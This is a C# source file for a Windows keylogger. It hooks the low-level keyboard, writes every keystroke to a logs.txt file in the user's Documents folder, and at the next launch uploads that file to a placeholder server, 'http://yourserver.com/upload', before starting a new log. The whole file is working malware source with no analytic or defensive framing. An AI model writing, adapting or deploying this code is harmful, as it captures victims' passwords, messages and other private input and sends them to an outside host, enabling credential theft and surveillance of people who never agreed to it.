using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


class Program
{
    [DllImport("user32.dll")]
    public static extern IntPtr SetWindowsHookExA(int idHook, HookProc lpfn, IntPtr hmod, uint dwThreadId);

    [DllImport("user32.dll")]
    public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern int ToUnicodeEx(uint uVirtKey, uint uScanCode, byte[] lpKeyState,
                                          StringBuilder lpChar, int nBufferSize, uint flags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    public static extern IntPtr GetKeyboardLayout(uint idThread);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern short GetAsyncKeyState(int vKey);

    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    public delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

    public static int WH_KEYBOARD_LL = 13;

    public static IntPtr hookId = IntPtr.Zero;

    public HookProc proc = HookCallback;

    public static string Documents = $"C:\\Users\\{Environment.UserName}\\Documents\\logs.txt";

    public static async Task Main(string[] args)
    {

        if (!File.Exists(Documents))
        {
            File.CreateText(Documents).Close();
        }
        else
        {
            await sendFile();
            

            using (StreamWriter sw = new StreamWriter(Documents, false))
            {
                sw.WriteLine("");
                sw.WriteLine("New session started at " + DateTime.Now);
            }
        }

        HookProc proc = HookCallback;
        hookId = setHook(proc);

        Application.Run();
    }

    public static IntPtr setHook(HookProc proc)
    {
        Process currentProcess = Process.GetCurrentProcess();
        ProcessModule currentModule = currentProcess.MainModule;
        IntPtr hhk = SetWindowsHookExA(WH_KEYBOARD_LL, proc, GetModuleHandle(currentModule.ModuleName), 0);
        return hhk;
    }

    public static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam)
    {
        if (code >= 0)
        {
            using (StreamWriter sw = new StreamWriter(Documents, true))
            {

                KBDLLHOOKSTRUCT kBDLLHOOKSTRUCT = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);

                if (kBDLLHOOKSTRUCT.vkCode == 0x20)
                {
                    sw.Write("");
                }

                if (kBDLLHOOKSTRUCT.vkCode == 0x0D)
                {
                    sw.WriteLine("");
                }


                if (wParam == 0x0101) // KEYUP
                {
                    string result = ConvertKeys(kBDLLHOOKSTRUCT.vkCode, kBDLLHOOKSTRUCT.scanCode);

                    if (kBDLLHOOKSTRUCT.vkCode == 0x08)
                    {
                        sw.Write("(VK_BACK)");
                    }
                    else
                    {

                        sw.Write(result);
                    }
                }
            }
        }

        return CallNextHookEx(hookId, code, wParam, lParam);
    }

    public static string ConvertKeys(uint wVirtKey, uint scanCode)
    {
        byte[] keyState = new byte[256];
        if (IsShiftPressed() || Control.IsKeyLocked(Keys.CapsLock))
        {
            keyState[0x10] = 0x80;
        }

        IntPtr hkl = GetKeyboardLayout(0);
        StringBuilder lpChar = new StringBuilder(2);

        int result = ToUnicodeEx(wVirtKey, scanCode, keyState, lpChar, lpChar.Capacity, 0, hkl);
        return lpChar.ToString();
    }

    public static bool IsShiftPressed()
    {
        return (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
    }

    public static async Task sendFile()
    {
        using (var client = new HttpClient())
        {
            var content = new MultipartFormDataContent();
            var fileStream = new FileStream(Documents, FileMode.Open, FileAccess.Read);
            var fileContent = new StreamContent(fileStream);
            content.Add(fileContent, "file", Path.GetFileName(Documents));
            var response = await client.PostAsync("http://yourserver.com/upload", content);
            if (response.IsSuccessStatusCode)
            {
                Console.WriteLine("File uploaded successfully.");
            }
            else
            {
                Console.WriteLine("File upload failed.");
            }
        }
    }
}